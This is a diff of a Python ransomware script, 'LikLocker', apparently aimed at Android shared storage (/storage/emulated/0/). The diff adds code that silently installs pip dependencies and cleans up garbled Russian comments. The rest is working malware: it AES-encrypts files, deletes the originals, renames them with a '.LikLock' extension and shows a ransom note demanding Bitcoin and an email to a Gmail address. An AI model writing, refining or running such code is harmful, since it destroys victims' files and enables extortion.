@@ -2,7 +2,27 @@ import os
 import base64
 import hashlib
 import getpass
+import subprocess
+import sys
 from concurrent.futures import ThreadPoolExecutor, as_completed
+
+# Функция для установки необходимых пакетов
+def install(package):
+    subprocess.check_call([sys.executable, '-m', 'pip', 'install', package], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+# Проверка и установка необходимых библиотек
+def check_and_install(package):
+    try:
+        __import__(package)
+    except ImportError:
+        install(package)
+
+# Проверяем и устанавливаем необходимые библиотеки
+required_packages = ['pycryptodome', 'tqdm', 'pyfiglet', 'termcolor']
+for package in required_packages:
+    check_and_install(package)
+
+# Импортируем библиотеки после их установки
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 from tqdm import tqdm
@@ -20,22 +40,22 @@ def encrypt_file(file_path, key):
     with open(file_path, 'rb') as file:
         plaintext = file.read()
     
-    if len(plaintext) > 50 * 1024 * 1024:  # Ðàçìåð ôàéëà áîëüøå 50 ÌÁ
-        return  # Ïðîïóñêàåì ôàéë áåç âûâîäà îøèáêè
+    if len(plaintext) > 50 * 1024 * 1024:  # размер файла более 50 МБ
+        return  # пропускаем файл с большим размером
 
     ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
     iv = cipher.iv
     
     encrypted_file_path = file_path + '.LikLock'
     
-    # Çàïèñü çàøèôðîâàííîãî ôàéëà ñ îòîáðàæåíèåì ïðîãðåññà
+    # Записываем зашифрованный файл с инициализационным вектором
     with open(encrypted_file_path, 'wb') as file:
         file.write(iv + ciphertext)
 
-    # Óäàëÿåì îðèãèíàëüíûé ôàéë ïîñëå óñïåøíîãî øèôðîâàíèÿ
+    # Удаляем оригинальный файл после шифрования
     os.remove(file_path)
     
-    # Âîçâðàùàåì çàøèôðîâàííîå èìÿ ôàéëà
+    # Переименовываем зашифрованный файл
     base64_encoded_name = base64.b64encode(os.path.basename(file_path).encode()).decode()
     os.rename(encrypted_file_path, os.path.join(os.path.dirname(file_path), base64_encoded_name + '.LikLock'))
     
@@ -44,14 +64,14 @@ def encrypt_file(file_path, key):
 def encrypt_directory(directory, key):
     files_to_encrypt = []
     
-    # Ñîáèðàåì âñå ôàéëû äëÿ øèôðîâàíèÿ
+    # Собирать все файлы для шифрования
     for root, _, files in os.walk(directory):
         for filename in files:
             file_path = os.path.join(root, filename)
             if not filename.endswith('.LikLock'):
                 files_to_encrypt.append(file_path)
 
-    # Øèôðóåì ôàéëû ñ îòîáðàæåíèåì ïðîãðåññà
+    # Шифровать файлы с использованием многопоточности
     with ThreadPoolExecutor() as executor:
         futures = {executor.submit(encrypt_file, file_path, key): file_path for file_path in files_to_encrypt}
         
@@ -59,44 +79,40 @@ def encrypt_directory(directory, key):
             for future in as_completed(futures):
                 file_path = futures[future]
                 try:
-                    future.result()  # Ïîëó÷àåì ðåçóëüòàò âûïîëíåíèÿ
+                    future.result()  # Получаем результат выполнения
                     pbar.set_postfix(file=file_path)
                 except Exception as e:
-                    print(f"Error encrypting {file_path}: {e}")  # Ìîæíî îñòàâèòü äëÿ îòëàäêè, åñëè íåîáõîäèìî
+                    print(f"Error encrypting {file_path}: {e}")  # Логирование ошибок
                 pbar.update(1)
 
 def display_warning():
-    # Î÷èùàåì ýêðàí
+    # Очистка экрана
     os.system('cls' if os.name == 'nt' else 'clear')
 
-    # Ãåíåðàöèÿ ASCII òåêñòà
+    # Генерация ASCII баннера
     ascii_banner = pyfiglet.figlet_format("LikLocker")
-    # Ðàñêðàñêà òåêñòà
     colored_banner = colored(ascii_banner, color='red')
-    # Âûâîä íà ýêðàí
     print(colored_banner)
 
-    # Òåêñò ñ ïðåäóïðåæäåíèåì
+    # Текст предупреждения
     warning_text = "Bad news, all your important files have been encrypted by LikLocker ransomware! " \
                    "To decrypt your files, you need to download decryptor. " \
                    "To receive it, you need to send 0.005 BTC to the Bitcoin wallet A728E05dk04gsJ7H " \
                    "and write about successful payment to LikLockerRransomware@gmail.com " \
                    "and wait until they send you decryptor."
 
-    # Îêðóæåíèå òåêñòà òî÷êàìè
-    border_length = len(warning_text) + 2  # äëèíà òåêñòà + 2 äëÿ òî÷åê ïî êðàÿì
-    border = '.' * border_length  # ðàìêà èç òî÷åê
+    border_length = len(warning_text) + 2  # длина текста + 2 для границ
+    border = '.' * border_length  # граница из точек
 
-    # Âûâîä íà ýêðàí
     print(border)
-    print(colored(f".{warning_text}.", color='red'))  # òåêñò â ðàìêå
+    print(colored(f".{warning_text}.", color='red'))  # текст в границах
     print(border)
 
 def main():
-    directory = '/storage/emulated/0/'  # Óñòàíîâëåííûé ïóòü
-    key = generate_key()  # Ãåíåðèðóåì óíèêàëüíûé êëþ÷ äëÿ óñòðîéñòâà
+    directory = '/storage/emulated/0/'  # Заданный путь
+    key = generate_key()  # Генерация уникального ключа для шифрования
     encrypt_directory(directory, key)
-    print("Øèôðîâàíèå çàâåðøåíî.")
+    print("Encryption completed.")
     display_warning()
 
 if __name__ == "__main__":
